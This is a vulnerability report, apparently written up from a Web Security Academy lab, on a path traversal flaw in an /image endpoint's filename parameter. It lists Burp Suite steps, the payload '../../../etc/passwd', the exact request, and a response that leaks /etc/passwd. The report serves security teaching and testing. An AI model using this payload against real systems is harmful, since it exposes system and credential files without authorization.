# Vulnerability Report: File Path Traversal via Image Filename Parameter

## 1. Executive Summary
- **Vulnerability Type:** File Path Traversal (Directory Traversal)
- **Severity:** High
- **Target Endpoint:** `/image`
- **Vulnerable Parameter:** `filename`
- **Impact:** An unauthenticated attacker can read arbitrary files from the server's filesystem, including sensitive system user configurations (`/etc/passwd`).

---

## 2. Vulnerability Description
The application allows users to view product images via the `filename` parameter on the `/image` endpoint. However, the backend application fails to sanitize relative path sequences (`../`). This allows an attacker to break out of the intended web root directory and traverse up to the operating system's root directory.

---

## 3. Steps to Reproduce (Proof of Concept - PoC)

1. Open Burp Suite and capture the web traffic of the shopping application.
2. Navigate to the homepage and locate an image request in **Proxy -> HTTP History**:
   `GET /image?filename=63.jpg HTTP/2`
3. Send this request to **Burp Repeater** (`Ctrl + R`).
4. Modify the `filename` parameter value from `63.jpg` to the path traversal payload:
   `../../../etc/passwd`
5. Click **Send**.
6. Observe that the server responds with an `HTTP/2 200 OK` status and leaks the internal `/etc/passwd` file.

### HTTP Request Sent:
```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0aa0007404fa255f80e08b6d007f0006.web-security-academy.net
Cookie: session=b9wH3DZqF1DPtkumvjO59FQpAuIGF6jk
```

### HTTP Response (Exfiltrated Data):
```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```
